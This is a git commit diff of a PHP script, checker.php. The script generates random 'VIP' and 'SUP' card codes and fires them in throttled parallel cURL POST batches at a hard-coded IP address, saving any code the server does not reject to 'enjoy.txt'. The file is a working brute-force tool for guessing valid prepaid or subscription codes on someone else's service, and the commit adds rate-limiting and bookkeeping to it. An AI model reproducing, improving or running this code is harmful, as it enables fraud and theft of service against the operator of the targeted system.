bef0b3d233eeb9704dfc1f6e610674cf0247d2f5
kamal <kamalammouri1994@gmail.com>
2024-01-07 12:15:34 +0100

    new with timeout and remove code

--- checker.php
+++ checker.php
@@ -43,11 +43,14 @@
  
 </html>
 
-
 <?php
-//phpinfo();
+
+//declare(strict_types=1);
+
 set_time_limit(0);
-function randPass($length, $strength=8) {
+
+function randPass($length, $strength = 8)
+{
     $vowels = 'aeuy';
     $consonants = 'bdghjmnpqrstvz';
     if ($strength >= 1) {
@@ -65,79 +68,66 @@ function randPass($length, $strength=8) {
 
     $password = '';
     $alt = time() % 2;
-        for ($i = 0; $i < $length; $i++) {
-            if ($alt == 1) {
-                $password .= $consonants[(rand() % strlen($consonants))];
-                $alt = 0;
-            } else {
-                $password .= $vowels[(rand() % strlen($vowels))];
-                $alt = 1;
-            }
+    for ($i = 0; $i < $length; $i++) {
+        if ($alt == 1) {
+            $password .= $consonants[(rand() % strlen($consonants))];
+            $alt = 0;
+        } else {
+            $password .= $vowels[(rand() % strlen($vowels))];
+            $alt = 1;
         }
-    return $password;   
+    }
+    return $password;
 }
 
-function generateRandom($length = 10) {
-
+function generateRandom($length = 10)
+{
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-
     $specials = '=+-_.';
-
     $charactersLength = strlen($characters);
 
     $randomString = '';
 
-    // Removed one from length to maintain desired length
-
-    // for special character addition
-
     for ($i = 0; $i < $length - 1; $i++) {
-
         $randomString .= $characters[rand(0, $charactersLength - 1)];
-
     }
-
-    // Add the special character:
 
     $randomString .= $specials[rand(0, strlen($specials) - 1)];
 
-    // Shuffle the returned string so the special is not always at the end
-
     return str_shuffle($randomString);
-
 }
 
-function genCodes($number,$package="VIP"){
+function genCodes($number, $package = "VIP")
+{
     $code_no = array();
-    switch($package) {
+    switch ($package) {
         case 'VIP':
-            $lenght=12;
-            $FirstChar = 'I03';
-        break;
+            $lenght = 12;
+            $FirstChar = 'I12';
+            break;
         case 'SUP':
-            $lenght=14;
+            $lenght = 14;
             $FirstChar = 'S';
-        break;
-
+            break;
     }
-    while(count($code_no)<=$number){
-        $codeX = $FirstChar.randPass($lenght);
-        // $codeX = generateRandom(14);
+    while (count($code_no) <= $number) {
+        $codeX = $FirstChar . randPass($lenght);
 
-        if(preg_match('/[^A-Za-z0-9]/', $codeX)){
-            if(getLineWithString($codeX) == -1){
-                array_push($code_no,$codeX);
+        if (preg_match('/[^A-Za-z0-9]/', $codeX)) {
+            if (getLineWithString($codeX) == -1) {
+                array_push($code_no, $codeX);
                 $file = fopen('codes.txt', 'a+');
-                fwrite($file, $codeX.PHP_EOL);
+                fwrite($file, $codeX . PHP_EOL);
                 fclose($file);
             }
         }
     }
 }
 
-function getLineWithString($str) {
-    $lines = file('codes.txt');  
-    if($lines !== ''){
+function getLineWithString($str)
+{
+    $lines = file('codes.txt');
+    if ($lines !== '') {
         foreach ($lines as $line) {
             if (strpos($line, $str) !== false) {
                 return $line;
@@ -147,85 +137,71 @@ function getLineWithString($str) {
     return -1;
 }
 
-function php_curl($checkCodes){
-    foreach($checkCodes as $code){
+function php_curl($checkCodes)
+{
+    foreach ($checkCodes as $code) {
         api($code);
     }
 }
 
-function api($code){
-        $url = 'http://45.91.82.31/';
-        // $url = 'http://194.124.216.122/';
-        $post_data['card_no'] = $code;
-        $post_data['sn'] = '191122021902';
-        $post_data['submit'] = 'query';
-        //$post_data['submit'] = 'charge';
-        $post_data['action'] = 'yes';
-        $post_data['check_valid'] = 'yes';
+function api($code)
+{
+    $url = 'http://194.124.216.122/';
+    $post_data['card_no'] = $code;
+    $post_data['submit'] = 'query';
+    $post_data['action'] = 'yes';
+    $post_data['check_valid'] = 'yes';
 
-        //traverse array and prepare data for posting (key1=value1)
-        foreach ( $post_data as $key => $value) {
-            $post_items[] = $key . '=' . $value;
-        }
-        //create the final string to be posted using implode()
-        $payload = implode ('&', $post_items);
+    foreach ($post_data as $key => $value) {
+        $post_items[] = $key . '=' . $value;
+    }
 
-        //create cURL connection
-        $ch =  curl_init();
-        //set options
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5000);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
-        curl_setopt($ch, CURLOPT_HEADER, 0);
+    $payload = implode('&', $post_items);
 
-        //perform our request
-        $response = curl_exec($ch);
-        //close the connection
-        curl_close($ch);
-        $rep = stripos($response, "document.getElementById('prompt').innerHTML");
-/*         $end = stripos($response, "</body>");
-        $body = substr($response,$start+46,$end-$start);*/
-        echo $rep;
-        if(!stripos($rep,'Error,Card_NO does not exist') && !stripos($rep,'Error,Invalid Card_NO')){
-            $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
-            fwrite($myfile, $code.':'.$rep);
-            fclose($myfile);
-        }
+    $ch =  curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5000);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
 
-        echo $code . ':' . $rep . '<br>';
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    $start = stripos($response, "document.getElementById('prompt').innerHTML");
+    $end = stripos($response, "</body>");
+    $body = substr($response, $start + 46, $end - $start);
+
+    if (!stripos($body, 'Error,Card_NO does not exist') && !stripos($body, 'Error,Invalid Card_NO')) {
+        $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
+        fwrite($myfile, $code . ':' . $body);
+        fclose($myfile);
+    }
+
+    print_r(['code' => $code, 'status' => $body]);
+    echo '<br>';
 }
 
-function php_curl_multi($codes){
-
-    $urls = array(
-        'http://45.91.82.31/',
-        'http://194.124.216.122/',
-    );
-    $keyUrl = array_rand($urls);
-    $url = $urls[$keyUrl];
-
-    $ch_index = array(); // store all curl init
+function php_curl_multi($codes)
+{
+    $url = 'http://194.124.216.122/';
+    $ch_index = array();
     $response = array();
 
-    // create both cURL resources
     foreach ($codes as $key => $code) {
-        $post_data['card_no'] = $code;
-        $post_data['sn'] = '191122021902';
+        $post_data['card_no'] = trim($code);
         $post_data['submit'] = 'query';
-        //$post_data['submit'] = 'charge';
         $post_data['action'] = 'yes';
         $post_data['check_valid'] = 'yes';
-    
-        //traverse array and prepare data for posting (key1=value1)
-        foreach ( $post_data as $key => $value) {
+
+        foreach ($post_data as $key => $value) {
             $post_items[] = $key . '=' . $value;
         }
-        //create the final string to be posted using implode()
-        $payload = implode ('&', $post_items);
+
+        $payload = implode('&', $post_items);
 
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
@@ -234,22 +210,17 @@ function php_curl_multi($codes){
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_HEADER, 0);
-        // curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
-        // curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
         $ch_index[] = $ch;
     }
 
-    //create the multiple cURL handle
     $mh = curl_multi_init();
 
-    //add the handles
     foreach ($ch_index as $key => $ch) {
-        curl_multi_add_handle($mh,$ch);
+        curl_multi_add_handle($mh, $ch);
     }
 
-    //execute the multi handle
     do {
         $status = curl_multi_exec($mh, $active);
         if ($active) {
@@ -257,130 +228,180 @@ function php_curl_multi($codes){
         }
     } while ($active && $status == CURLM_OK);
 
-    //close the handles
     foreach ($ch_index as $key => $ch) {
+        $response[] = curl_multi_getcontent($ch);
         curl_multi_remove_handle($mh, $ch);
     }
+
     curl_multi_close($mh);
-    
-    // get all response
-    foreach ($ch_index as $key => $ch) {
-        $response[] = isset($ch_index[1]) ? curl_multi_getcontent($ch) : null;
-    }
 
     return $response;
 }
 
-function incrementCounter($newCounter){
+function php_curl_multi_with_timeout($codes, $timeout_interval = 100, $timeout_sleep = 1)
+{
+    $url = 'http://194.124.216.122/';
+    $ch_index = array();
+    $response = array();
+
+    foreach ($codes as $key => $code) {
+        $post_data['card_no'] = trim($code);
+        $post_data['submit'] = 'query';
+        $post_data['action'] = 'yes';
+        $post_data['check_valid'] = 'yes';
+
+        foreach ($post_data as $key => $value) {
+            $post_items[] = $key . '=' . $value;
+        }
+
+        $payload = implode('&', $post_items);
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5000);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $ch_index[] = $ch;
+    }
+
+    $mh = curl_multi_init();
+    $request_count = count($ch_index);
+
+    for ($i = 0; $i < $request_count; $i++) {
+        curl_multi_add_handle($mh, $ch_index[$i]);
+
+        // Introduce timeout interval
+        if (($i + 1) % $timeout_interval === 0 && $i !== 0) {
+            usleep($timeout_sleep * 1000000); // Sleep for $timeout_sleep seconds
+        }
+    }
+
+    do {
+        $status = curl_multi_exec($mh, $active);
+        if ($active) {
+            curl_multi_select($mh);
+        }
+    } while ($active && $status == CURLM_OK);
+
+    foreach ($ch_index as $key => $ch) {
+        $response[] = curl_multi_getcontent($ch);
+        curl_multi_remove_handle($mh, $ch);
+    }
+
+    curl_multi_close($mh);
+
+    return $response;
+}
+
+
+function incrementCounter($newCounter)
+{
     $newContent = implode("\n", $newCounter);
-    $fp = fopen('counter.txt', "w+");   // w+ means create new or replace the old file-content
+    $fp = fopen('counter.txt', "w+");
     fputs($fp, $newContent);
     fclose($fp);
 }
 
-function execute($number=0){
+function execute($number = 0)
+{
     $file = file('codes.txt');
     $fileCounter = file('counter.txt');
-    if($number != 0) $setNum = $number;
-    if($number == 0) $setNum = count($file);
-    $startNum = isset($fileCounter[0]) ? $fileCounter[0] : 0 ;
+    if ($number != 0) $setNum = $number;
+    if ($number == 0) $setNum = count($file);
+    $startNum = $fileCounter[0] ?? 0;
     $endNum = $startNum + $setNum;
-    // Remove first line
+
     array_shift($fileCounter);
-    // Add the new line to the beginning
+
     array_unshift($fileCounter, $endNum);
-    // Write the file back
+
     incrementCounter($fileCounter);
-    
+
     $checkCodes = array();
-    for($i=$startNum; $i<$endNum; $i++){
-        if (isset($file[$i])) {
-            array_push($checkCodes, $file[$i]);
-        }
+    for ($i = $startNum; $i < $endNum; $i++) {
+        array_push($checkCodes, $file[$i]);
     }
+
     $multiArrayCode = array_chunk($checkCodes, 100);
     foreach ($multiArrayCode as $keyX => $codes) {
-        $response = php_curl_multi($codes);
+        $response = php_curl_multi_with_timeout($codes);
         foreach ($response as $key => $value) {
-            $resp = stripos($value, "document.getElementById('prompt').innerHTML");
+            $start = stripos($value, "document.getElementById('prompt').innerHTML");
             $end = stripos($value, "</body>");
-            //$body = substr($value,$start+46,$end-$start);
-            $token = trim(strip_tags(getStr($value,'"id": "','"')));
-
-            if($resp == ''){
+            $body = substr($value, $start + 46, $end - $start);
+            removeCodeFromFile($codes[$key]);
+            if ($body == '') {
                 $myfile = fopen("codes.txt", "a") or die("Unable to open file!");
                 fwrite($myfile, $codes[$key]);
                 fclose($myfile);
             }
-/*             if(!stripos($resp,'Error,Card_NO does not exist') && !stripos($resp,'Error,Invalid Card_NO')){
+            if (!stripos($body, 'Error,Card_NO does not exist') && !stripos($body, 'Error,Invalid Card_NO')) {
                 $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
-                fwrite($myfile, $codes[$key].':'.$resp);
+                fwrite($myfile, $codes[$key] . ':' . $body);
                 fclose($myfile);
-                print_r(['code'=>$codes[$key],'status'=>$resp]);
-                echo '<br>';
-            } */
-
-            if(stripos($resp,'Charge Successfully')){
-                $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
-                fwrite($myfile, $codes[$key].':'.$resp);
-                fclose($myfile);
-                print_r(['code'=>$codes[$key],'status'=>$resp]);
+                print_r(['code' => $codes[$key], 'status' => $body]);
                 echo '<br>';
             }
 
-            if($number == $key+1*$keyX+1){
+            if ($number == $key + 1 * $keyX + 1) {
                 ob_start();
-                echo 'vip iks is end';  
-                // some statement that removes all printed/echoed items
+                echo 'vip iks is end';
                 ob_end_clean();
             }
-            
-            //print_r(['code'=>$codes[$key],'status'=>$body]);
-            echo 'code =>'.$codes[$key].': status => '.$resp.'<br>';
+
+            print_r(['code' => $codes[$key], 'status' => $body]);
+            echo '<br>';
         }
     }
 }
 
-
-function changeCode($newKey){
+function changeCode($newKey)
+{
     $file = file('codes.txt');
-    $fp = fopen('codes.txt', 'w+');   // w+ means create new or replace the old file-content
-    foreach($file as $i => $code){
-        // $file[$i][0] = $newKey; 
+    $fp = fopen('codes.txt', 'w+');
+    foreach ($file as $i => $code) {
         $code[0] = $newKey;
         fwrite($fp, $code);
     }
-    // fputs($fp, $newFile);
     fclose($fp);
 }
 
-
-
-if(isset($_POST['check'])) {
-    if(isset($_POST['repeat'])){
-        echo 'vip iks is runing => '.$_POST['repeat'].' time <br>';   
-        execute($_POST['repeat']);
-    }
-}
-
-else if(isset($_POST['query'])) {
-        echo 'check card_no => '.$_POST['card_no'].'<br>';   
-        if(isset($_POST['card_no'])){
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['check'])) {
+        if (isset($_POST['repeat'])) {
+            echo 'vip iks is running => ' . $_POST['repeat'] . ' time <br>';
+            execute((int)$_POST['repeat']);
+        }
+    } elseif (isset($_POST['query'])) {
+        echo 'check card_no => ' . $_POST['card_no'] . '<br>';
+        if (isset($_POST['card_no'])) {
             api($_POST['card_no']);
         }
-}
-else if(isset($_POST['gen'])) { 
-    if(isset($_POST['package'])){
-        genCodes($_POST['codes_lenght'],$_POST['package']);
+    } elseif (isset($_POST['gen'])) {
+        if (isset($_POST['package']) && isset($_POST['codes_lenght'])) {
+            genCodes((int)$_POST['codes_lenght'], $_POST['package']);
+        }
     }
 }
 
-function GetStr($string, $start, $end) {
-    $str = explode($start, $string);
-    $str = explode($end, $str[1]);  
-    return $str[0];
+
+function removeCodeFromFile($checkedCode)
+{
+    $file = file('codes.txt');
+    $fp = fopen('codes.txt', 'w+');
+
+    foreach ($file as $code) {
+        $trimmedCode = trim($code);
+        if ($trimmedCode !== $checkedCode) {
+            fwrite($fp, $code);
+        }
+    }
+
+    fclose($fp);
 }
 
-    // changeCode('I');
-    // genCodes(10000);
 clearstatcache();
